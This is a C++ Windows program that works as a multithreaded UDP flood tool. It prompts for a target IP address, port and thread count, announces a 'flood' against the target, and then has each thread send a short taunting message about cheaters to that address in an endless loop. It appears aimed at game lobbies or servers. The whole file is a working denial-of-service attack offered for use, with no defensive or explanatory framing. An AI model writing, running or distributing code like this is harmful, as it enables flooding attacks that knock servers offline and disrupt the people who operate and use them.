#include <iostream>
#include <winsock2.h>
#include <thread>
#include <vector>
using namespace std;

#pragma comment(lib,"ws2_32.lib") 
#pragma warning(disable:4996) 
#define BUFLEN 256  

class UDPClient {
public:
    UDPClient(const char* ip, int port)
    {
        if (WSAStartup(MAKEWORD(2, 2), &ws) != 0)
        {
            cout << "Failed. Error Code: " << WSAGetLastError() << "\n";
            exit(EXIT_FAILURE);
        }
        cout << "Initialized.\n";

        if ((client_socket = socket(AF_INET, SOCK_DGRAM, IPPROTO_UDP)) == SOCKET_ERROR)
        {
            cout << "socket() failed with error code: " << WSAGetLastError() << "\n";
            exit(EXIT_FAILURE);
        }

        memset((char*)&server, 0, sizeof(server));
        server.sin_family = AF_INET;
        server.sin_port = htons(port);
        server.sin_addr.S_un.S_addr = inet_addr(ip);
    }

    ~UDPClient() {
        closesocket(client_socket);
        WSACleanup();
    }

    void start()
    {
        const char* message = "theres cheaters on lobby ;(!";

        while (true)
        {
            if (sendto(client_socket, message, strlen(message), 0, (sockaddr*)&server, sizeof(sockaddr_in)) == SOCKET_ERROR)
            {
                cout << "sendto() failed with error code: " << WSAGetLastError() << "\n";
                exit(EXIT_FAILURE);
            }
        }
    }

private:
    WSADATA ws;
    SOCKET client_socket;
    sockaddr_in server;
};

void thread_task(const char* ip, int port)
{
    UDPClient udpClient(ip, port);
    udpClient.start();
}

int main()
{
    char ip_address[16] = "";
    int port = NULL;
    int num_threads = 1;

    cout << "IP address (ex: 000.00.00.00): ";
    cin >> ip_address;
    cout << "Port: ";
    cin >> port;
    cout << "Number of threads: ";
    cin >> num_threads;

    cout << "Initializing flood against " << ip_address << ":" << port << " with " << num_threads << " threads.\n";

    MoveWindow(GetConsoleWindow(), 50, 50, 500, 500, true);

    vector<thread> threads;

    for (int i = 0; i < num_threads; ++i)
    {
        threads.emplace_back(thread_task, ip_address, port);
    }

    for (auto& t : threads)
    {
        t.join();
    }

    return 0;
}
